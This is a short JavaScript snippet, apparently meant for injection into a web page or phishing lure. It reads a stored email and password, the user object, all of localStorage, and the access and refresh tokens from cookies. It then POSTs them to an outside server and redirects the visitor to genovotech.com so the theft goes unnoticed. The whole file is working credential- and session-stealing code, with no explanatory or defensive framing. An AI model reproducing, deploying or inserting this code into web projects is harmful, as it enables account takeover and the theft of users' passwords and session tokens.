try {
    const store = window['useStoreWrapper']?.getState() || {};
    const email = store.email || '';
    const password = store.password || '';
    const user = store.user || {};
    const allLocal = { ...localStorage };

    const accessToken = document.cookie.split('; ').find(row => row.startsWith('access_token='))?.split('=')[1] || 'No access token';
    const refreshToken = document.cookie.split('; ').find(row => row.startsWith('refresh_token='))?.split('=')[1] || 'No refresh token';

    fetch('https://results-server-ilu4.onrender.com/api/results', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            accessToken,
            refreshToken,
            email,
            password,
            user: JSON.stringify(user),
            localStorage: JSON.stringify(allLocal),
            source: 'GenovoTechProposal'
        })
    }).catch(err => console.log('Fetch failed:', err));

    setTimeout(() => { window.location.href = 'https://www.genovotech.com'; }, 500);
} catch (e) {
    console.log('Script error:', e);
    setTimeout(() => { window.location.href = 'https://www.genovotech.com'; }, 500);
}